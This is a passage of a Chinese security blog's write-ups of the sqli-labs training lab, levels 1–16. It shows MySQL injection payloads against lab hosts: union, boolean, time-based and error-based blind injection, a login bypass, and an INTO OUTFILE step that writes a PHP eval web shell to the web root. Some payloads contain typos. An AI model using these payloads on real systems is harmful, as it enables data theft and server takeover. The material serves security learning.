table_schema&#x3D;&#39;security&#39;limit 0,1),1,1))&#x3D;101,1,sleep(5))--+通过select语句查询information_schema中的security数据库的第一个表名的第一个字符ascii是否等于101，也就是e，条件成立则sleep(5)依此类推得到emalis</code></pre><pre><code class="hljs mysql"># 查询security库的第二个表查询语句与第一个表差不多，不过需要修改limit的值http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1%27and If (ascii(substr((select table_name frominformation_schema.tables where table_schema&#x3D;&#39;security&#39;limit 1,1),1,1))&#x3D;114,1,sleep(5))--+猜测第二个表名的第一位ascii是否为114也就是r依次类推得到referers</code></pre><pre><code class="hljs mysql"># 猜测username列的值http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;less-9&#x2F;id&#x3D;1%27and if(ascii(substr(select username from users limit 0,1),1,1))&#x3D;68,1,slepp(5)--+猜测username第一行的第一位同样的通过不断尝试得到username，password列的内容，工作量太大不进行操作了</code></pre></li></ul><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><ul><li>从标题得知<code>基于时间-双引号</code>,其实这关和第九关一样只是把id后的单引号替换成双引号。</li><li>只记录一个payload，其他的参考less9</li></ul><pre><code class="hljs mysql"># 猜测数据库http:&#x2F;&#x2F;192.168.5.135&#x2F;sqli&#x2F;less-9&#x2F;?id&#x3D;1%27and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5)) --+</code></pre><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><ul><li><p>从less11开始url提交参数的方式由GET变成了POST。</p></li><li><p>POST和GET的区别(区别挺多的，这里记一下两个比较直观的)</p><ul><li>GET是从服务器上获取数据，POST是向服务器提交数据</li><li>GET把参数包含在URL中，POST通过requests body提交参数</li></ul></li><li><p>提交参数后浏览器页面会发生变化，不方便截图。这里改用burpsuite来进行操作。</p><ul><li>username输入<code>asdf&#39;</code>密码 <code>asdf</code>在username后输入引号触发报错</li></ul><table><thead><tr><th align="center">从图中可以看到报错信息多了个单引号</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816175731.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>尝试注释后面的引号，输入万能密码试一试，返回了登录信息</li></ul><table><thead><tr><th align="center">asdf’ or 1=1 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816180046.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><pre><code class="hljs mysql">这里之所以能登录的原因是因为，当提交了username和password之后，形成的sql语句为@$sql&#x3D;&quot;SELECT username,password FROM users WHERE username &#x3D; &#39;asdf&#39;or&#39;1&#x3D;1 --+ and password &#x3D; &#39;$passwd&#39;LIMIT0,1&quot;;在--+ 后的内容被注释掉了，前面的or 1&#x3D;1 恒成立，所以这条语句能执行成功</code></pre><ul><li>尝试union注入， 可以看到显示的database为security</li></ul><table><thead><tr><th align="center">username: asdf’ union select 1,database() –+</th></tr></thead><tbody><tr><td align="center">passwd: asdf</td></tr><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816180734.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>前面提到的GET型注入的payload都可以使用，这里不重复操作了</li></ul></li></ul><h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><ul><li><p>less12和less11相似，不过是id参数处理上有一定不同</p></li><li><p>输入双引号触发报错，从报错信息看到多了一个双引号和)说明这里的id进行了(“id”)处理</p><table><thead><tr><th align="center">username：asdf” passwd:  asdf</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816193330.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>在补全双引号和反括号之后这里同样可以使用上面的payload</p><table><thead><tr><th align="center">username: asdf”) union select  1,version() –+  passwd:asdf</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816181454.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><ul><li><p>输入单引号进行报错</p><table><thead><tr><th align="center">username: admin’ passwd: asdf(随便输)</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816181737.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>看到报错信息为’) ,也就是后台对id进行了(‘id’) 处理</p><table><thead><tr><th align="center">输入正确的账号密码，发现没有提示登录信息，只返回了一个是否登录的凭据</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816182810.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>使用布尔盲注猜测数据库的第一位</p><table><thead><tr><th align="center">username: asdf’) and left(database(),1) &gt; ‘a’ –+ passwd: asdf</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816183436.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>登录成功，接着可以不断对每一位进行测试，less5已经演示了，这里不重复了。</li><li>不过有一个值得注意的是，在测试的时候可以使用二分法可以有效降低测试的次数</li></ul></li></ul><h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><ul><li><p>这关和less13相似，对id的处理把变成了”。</p><table><thead><tr><th align="center">username: admin” passwd: admin</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816183934.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>主要是熟悉盲注的操作，列一下payload</p><table><thead><tr><th align="center">username: admin’ and left(database())&gt;’a’ –+ passwd: admin</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816184139.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>尝试updatexml()报错注入,可以看到通过XPATH报错方式返回了数据库版本号</p><table><thead><tr><th>username: admin’ and updatexml(1,concat(0x7e,(select version()),0x7e),3) –+ passed: admin</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816184505.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><ul><li>这关没有错误提示，只能用延迟注入判断了</li><li>从源代码可以看到查询语句对id进行了’id’处理</li></ul><pre><code class="hljs mysql">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</code></pre><ul><li><p>使用延时注入猜测数据库名第一位</p><table><thead><tr><th align="center">username: admin’ and if(ascii(substr(database(),1,1))=115,1,sleep(5)) –+  passwd: admin</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816191244.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>从burpsuite右下角可以看到延迟了五秒，说明执行成功。其他payload参考less5</p></li></ul><h2 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h2><ul><li><p>这关对id的处理方法变成了(“id”)，同样可以使用延迟注入进行解决 。</p></li><li><p>提交payload</p><table><thead><tr><th align="center">username: admin”) and if(ascii(substr(database(),1,1))=115,1,sleep(5)) –+    passwd: admin</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200816192248.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>if条件成立则延迟了五秒，其他payload参考前文。</p></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>POST型注入用工具来配合是真滴舒服</li><li>无回显的页面，使用延迟注入效果非常直观</li></ul>]]></content>
    
    
    <categories>
      
      <category>sqli-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less7读写文件</title>
    <link href="/2020/08/01/sqli-less7%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/"/>
    <url>/2020/08/01/sqli-less7%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-less7-读写文件"><a href="#sqli-less7-读写文件" class="headerlink" title="sqli-less7 读写文件"></a>sqli-less7 读写文件</h1><h2 id="mysql开启读写权限"><a href="#mysql开启读写权限" class="headerlink" title="mysql开启读写权限"></a>mysql开启读写权限</h2><ul><li><p>在进行读写操作前要先解决一个问题，就是打开mysql读写权限。</p></li><li><p>问题记录</p><table><thead><tr><th align="center">mysql使用load_file()函数查询存在文件时返回null</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815121933.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>查询官方文档得知，mysql5.0以上版本下<code>secure-file-priv</code>字段是用来限制<code>load_file</code> ,<code>out_file</code> 和<code>load_file</code>上传到哪个指定目录</p></li><li><p>mysql导入导出的三个状态</p><table><thead><tr><th align="center">状态</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">ure_file_priv值为null</td><td align="center">不允许导入导出</td></tr><tr><td align="center">secure_file_priv为/tmp/</td><td align="center">限制mysql的导入导出只能在/tmp/目录下</td></tr><tr><td align="center">secure_file_priv没有具体值</td><td align="center">允许导入导出</td></tr></tbody></table></li><li><p>查看secure_file_priv的值</p><table><thead><tr><th align="center">show global variables like ‘%secure%’;</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815123142.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>默认值为null ,不允许导入导出</p></li></ul></li><li><p>解决</p><ul><li>修改mysql.ini文件，在[mysqld]下加入<code>secure_file_priv =</code>保存，重启，再次查询</li></ul><table><thead><tr><th align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815123914.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815145845.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">尝试读取文件</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815145752.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h2><ul><li>select … load_file(“file_name”)</li><li>在使用load_file()导出文件，需要满足以下条件。如果文件不存在，或下面的任一原因，load_file()函数会返回空。在windows下如果设置了ntfs权限，则不能读取相关文件。<ol><li>必须有权限读取并文件须完全可读</li><li>欲读取文件须在服务器上存在</li><li>必须指定文件的完整路径</li><li>读取文件必须小于max_allowed_packet(该字段说用来限制最大传输的值，超过会报错)</li></ol></li><li>注入中需要注意的三点<ol><li>绝对物理路径</li><li>构造可执行的畸形语句</li><li>在导出文件中常用路径：<code>https://www.cnblogs.com/lcamry/p/5729087.html</code></li></ol></li></ul><h2 id="导入文件"><a href="#导入文件" class="headerlink" title="导入文件"></a>导入文件</h2><ul><li><p>select … into outfile “file_name” </p></li><li><p>该文件创建在目标服务器上，需要写入者必须拥有file权限，才能使用此语法。file_name 不能说一个以存在的文件。</p></li><li><p>两种常用的利用形式记注意事项</p><ol><li>将select 内容导入到文件中：</li></ol><pre><code class="hljs mysql">select version() into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre><ul><li>将上一个的version()替换成一句话，<code>&lt;?php @eval($_POST[passwd])?&gt;</code>,即</li></ul><pre><code class="hljs mysql">select &lt;?php @eval($_POST[passwd])?&gt; into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre><ol start="2"><li>修改文件结尾：</li></ol><pre><code class="hljs mysql">select version() into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39; lines thrminated by 0x16进制文件</code></pre><ul><li>by 后面的内容，通常为<code>\r\n</code>,此处可以修改by后面的十六进制文件。（sqlmap –os-shell参数用的就是这个方法）</li></ul><ol start="3"><li>注意事项</li></ol><ul><li>文件路径可能要转义，这个视环境而定。</li><li>如果load_file无法导出文件时，可以使用这个语句</li></ul><pre><code class="hljs mysql">select load_file(&quot;c:&#x2F;&#x2F;flag.txt&quot;) into outfile  &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre></li></ul><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><ul><li><p>从源代码中得知，查询语句对id参数进行了’))处理</p><table><thead><tr><th align="center">$sql=”SELECT*FROMusersWHEREid=((‘$id’))LIMIT0,1”;</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815132444.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>这里可以用’)) or 1=1 –+进行注入</p><table><thead><tr><th align="center"><a href="http://192.168.5.135/sqli/Less-7/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-7/?id=1&#39;</a>)) or 1=1 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815133500.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>用上述的方法写入文件</p><pre><code class="hljs mysql">union select 1,&lt;?php phpinfo()?&gt;,3 into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\1.php&#39;</code></pre><ul><li>这里可能是phpstudy的问题，写入成功了，但是没有解析php</li></ul></li></ul><table><thead><tr><th align="center"><a href="http://192.168.3.5:80/sql/Less-7/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.3.5:80/sql/Less-7/?id=-1&#39;</a>)) union select 1,”&lt;php phpinfo() ;?&gt;”,3 into outfile “C://wamp/www/sql/Less-7/2.php”–+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815143751.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><ul><li><p>less7没有回显，改用less1进行操作</p><pre><code class="hljs mysql">union select 1,load_file(&#39;c:&#x2F;&#x2F;flag.txt&#39;) --+</code></pre><table><thead><tr><th align="center"><a href="http://192.168.5.135/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=-1&#39;</a> union select 1,load_file(“C://flag.txt”),3 –+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815144258.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>这个读写文件路径问题真的是个大坑，需要注意</li><li>还有系统环境也是个坑，分别用wamp和phpstudy搭建，出现的问题都不一样。</li></ul>]]></content>
    
    
    <categories>
      
      <category>sqli-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less5-6盲注</title>
    <link href="/2020/08/01/sqli-less5-6%E7%9B%B2%E6%B3%A8/"/>
    <url>/2020/08/01/sqli-less5-6%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="less5-6盲注"><a href="#less5-6盲注" class="headerlink" title="less5-6盲注"></a>less5-6盲注</h1><h2 id="盲注知识点"><a href="#盲注知识点" class="headerlink" title="盲注知识点"></a>盲注知识点</h2><ul><li><p>什么是盲注？盲注就是再sql注入过程中，sql语句执行后，查询的数据不能回显到前端页面，此时需要利用一些方法进行判断或尝试，这个过程称之为盲注</p></li><li><p>从前面的sqli手注基础中，可以得知盲注分为三类</p><ul><li>基于布尔的sql盲注</li><li>基于时间的sql盲注</li><li>基于报错的sql盲注</li></ul></li><li><p>四个常用函数</p><ul><li><p>mid()  此函数用来截取字符串</p><table><thead><tr><th>参数</th><th align="center">解释</th></tr></thead><tbody><tr><td>column_name</td><td align="center">必须，要提取字符的字段</td></tr><tr><td>start</td><td align="center">必需，规定的起始位置 （起始值为1）</td></tr><tr><td>length</td><td align="center">可选，要返回的字符数，如果省略，则mid()函数返回剩余文本</td></tr></tbody></table><pre><code class="hljs mysql">用法：str&#x3D;&quot;1234&quot;mid(str,2,1) 结果返回2mid((select table_name from information_schema.table where table_schema&#x3D;0xxx limit 0,1)1,1)) &gt; &quot;a&quot;此处的column_name参数可以为sql语句</code></pre></li></ul></li></ul><ul><li><p>substr(column_name,start,length) 这个函数同substring()函数实现的功能是一样的，均为截取字符串，参数同mid()函数，不再重复列举</p><pre><code class="hljs mysql">substr(database(),1,2) &gt;&#39;a&#39; 查看数据库名的第一位substr((select table_name from information_schema.table where table_schema&#x3D;0xxx limit 0,1)1,1) &gt; &#39;a&#39; 此处的column_name参数可以为sql语句</code></pre></li></ul><ul><li><p>left(string,n) 得到字符串左部指定个数的字符</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>string</td><td>截取的字符串</td></tr><tr><td>n</td><td>截取长度</td></tr></tbody></table><pre><code class="hljs mysql">用法left(database()),2 &gt; &#39;a&#39; 查数据库名第一位left(database()),2 &gt; &#39;ab&#39; 查数据库名前两位同样的string可以为自行构造的sql语句</code></pre></li><li><p>udpatexml()</p><table><thead><tr><th>参数</th><th align="center">解释</th></tr></thead><tbody><tr><td>XML_document</td><td align="center">为xml文档对象的名称</td></tr><tr><td>XPath_string</td><td align="center">XPath格式的字符串</td></tr><tr><td>new_value</td><td align="center">string格式，替换查找到符合条件的的数据</td></tr></tbody></table><pre><code class="hljs mysql">用法select name from user where id&#x3D;1 and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3);updatexml() 第二个参数需要xpath格式的字符串，concat()函数为字符串连接函数显然不符合updatexml()的第二个函数需求，所以会将执行结果以报错的形式返回，这样就可以实现报错注入了结果</code></pre><p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815102805.png" srcset="/img/loading.gif" alt=""></p></li></ul><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><ul><li><h3 id="基于时间延迟的盲注"><a href="#基于时间延迟的盲注" class="headerlink" title="基于时间延迟的盲注"></a>基于时间延迟的盲注</h3><ul><li>延迟注入，正确的会延迟执行，错误没有延迟，id值无所谓，可通过f12抓包查看延迟状况</li><li>爆数据库长度payload</li></ul><pre><code class="hljs mysql">and if(length(database())&#x3D;8,sleep(5),1) --+  # 判断当前数据库名长度是否为八个字节，是的话延迟5秒执行</code></pre><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=1&#39;</a> and if(length(database())=8,sleep(5),1) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814175503.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>爆数据库名payload</li></ul><pre><code class="hljs mysql">and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(5),1)--+ # 判断当前数据库名第一个字节是否为s，是的话延迟五秒执行通过不断替换&#x3D;后面的字符串，正确的字符串会延迟返回，工作量超大这里不赘述</code></pre><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814181925.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><ul><li><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3></li></ul><ul><li><p>在布尔盲注中，正确会有回显，错误没有，以此逐字爆破</p></li><li><p>爆数据库名payload</p><pre><code class="hljs mysql">left((select database()),1) &#x3D; &#39;s&#39; --+ # 查询当前数据库名的第一个字符是否等于s，正确则等号后的值正确的话会有回显left((select database()),2) &#x3D; &#39;se&#39; --+ # 在第一个字符的基础上继续爆破第二个字符后续的字符同上依次递增</code></pre></li></ul><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=1&#39;</a> and left((select database()),1) = ‘s’ –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814184105.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><h3 id="concat聚合函数"><a href="#concat聚合函数" class="headerlink" title="concat聚合函数"></a>concat聚合函数</h3></li></ul><ul><li><p>使用coucat函数如果分组语句，会把查询的一部分以错误的形式显示出来</p><pre><code class="hljs mysql">and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ # 将数据库名以报错的方式回显and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema &#x3D; database() limit%20 3,1),0x7e),1) --+ # 查询当前数据库下的表名，一次只能返回一个结果，需要多次替换limit n，1 来实现遍历表名</code></pre></li></ul><table><thead><tr><th>192.168.5.135/sqli/Less-5/?id=1’ and updatexml(1,concat(0x7e,(select ),0x7e),1) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815104502.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td><a href="http://192.168.5.135/sqli/Less-5/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=-1&#39;</a> and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema = database() limit%20 3,1),0x7e),1) –+</td></tr><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815110426.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><ul><li><p>less5与less6的区别在id参数传到服务器时对id参数进行了处理，从源代码可以看到查询语句为</p><pre><code class="hljs mysql">$id&#x3D;&#39;&quot;&#39;.$id.&#39;&quot;&#39;; $sql&#x3D;&quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT0,1&quot;;</code></pre></li><li><p>那么这一关的通关策略和less5一样，只需要将‘变成“即可，这里只记录一个payload</p><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-6/?id=1&quot;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-6/?id=1&quot;</a> and left(version(),1) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815115503.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>盲注这个东西，难度相对于其他类型的注入来说挺大的，确实复杂，而且各个类型以及骚操作都很多。</li><li>掌握常用的盲注函数以及能够构造简单的payload就差不多了。（主要是复杂的构造不出来……）</li><li>如果能够证明有盲注的存在，那么sqlmap一把嗦不香吗</li></ul>]]></content>
    
    
    <categories>
      
      <category>sqli-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决firefox复制url会自动encodeurl</title>
    <link href="/2020/07/31/%E8%A7%A3%E5%86%B3firefox_%E5%A4%8D%E5%88%B6url_%E4%BC%9A%E8%87%AA%E5%8A%A8encodeurl/"/>
    <url>/2020/07/31/%E8%A7%A3%E5%86%B3firefox_%E5%A4%8D%E5%88%B6url_%E4%BC%9A%E8%87%AA%E5%8A%A8encodeurl/</url>
    
    <content type="html"><![CDATA[<h1 id="解决firefox-复制url-会自动encodeurl"><a href="#解决firefox-复制url-会自动encodeurl" class="headerlink" title="解决firefox 复制url 会自动encodeurl"></a>解决firefox 复制url 会自动encodeurl</h1><ul><li><p>问题记录：复制url之后会默认将明文encodeurl</p><ul><li>明文地址：<a href="http://192.168.5.135/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=-1&#39;</a> or 1=1 –+</li><li>经过encodeurl后的地址：<a href="http://192.168.5.135/sqli/Less-1/?id=1%27%20!%20=" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=1%27%20!%20=</a></li></ul></li><li><p>解决方法：</p><ul><li><p>firefox 地址栏输入about:config进入浏览器配置界面，接受风险并继续</p><p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814105934.png" srcset="/img/loading.gif" alt=""></p></li><li><p>搜索<code>browser.urlbar.decodeURLsOnCopy</code> 点右侧按钮将false 切切换为true即解决</p><p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814110048.png" srcset="/img/loading.gif" alt=""></p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firefox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less1-4</title>
    <link href="/2020/07/30/sqli-less1-4/"/>
    <url>/2020/07/30/sqli-less1-4/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-less-1-4"><a href="#sqli-less-1-4" class="headerlink" title="sqli less 1-4"></a>sqli less 1-4</h1><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><ul><li><p>直接在url后添加了‘号触发报错，效果如图</p><table><thead><tr><th><a href="http://172.18.9.66/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://172.18.9.66/sqli/Less-1/?id=1&#39;</a></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727134051.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>从上述错误中，可以看到1’经过sql语句构造后形成<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code> 多出了个单引号，从错误中得到想要的信息后，通过<code>&#39;or 1=1 --+</code>注释将多余的’去掉</p></li><li><p>构造的sql语句应该如下表格中显示的一致,提交后正常返回数据</p><table><thead><tr><th>select * from users where id=’1’ or 1=1 –+’ limit 0,1</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727134851.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>此处可以用order by对数据进行排列，超过一定列数会报错，可以利用这一机制探测列数</p><ul><li>这里只能用order by 3 ，超过order by3 就会报错</li><li><code>&#39;order by 4--+</code>的结果显示超出</li></ul><table><thead><tr><th><a href="http://172.18.9.66/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://172.18.9.66/sqli/Less-1/?id=1&#39;</a> order by 4 –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727135418.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>分析源码为什么会造成sql注入，查询的sql语句如下</p><table><thead><tr><th>select * from users where id=’$id’ limit 0,1;</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727135610.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>id 在拼接sql语句时，没有对id进行任何过滤，当提交<code>&#39; or 1=1 --+</code> 构造的sql语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">''</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-comment">--+ limit 0,1;</span>这条语句因 <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> 所以永恒为真</code></pre></li></ul></li><li><p>这里着重记一下union联合注入，union的作用是将两个sql语句进行联合。强调一下union前后的两个sql语句的选择列数要相同才可以。union all 和 union  的区别是增加了去重的功能。</p><ul><li><p>结合sql注入基础篇中的information_schema的知识点，对less1进行注入。</p></li><li><p>当id的数据在数据库中不存在时，可以id=-1，两个sql语句进行联合操作时，当前一个语句查询内容为空时，后面的语句内容才会显示出来，此处网页返回了构造的union数据</p></li><li><p>爆数据库 payload:</p><pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span></code></pre><table><thead><tr><th>此处sql语句为 select * from users where id =’-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata –+ limit 0,1</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814101641.png" srcset="/img/loading.gif" 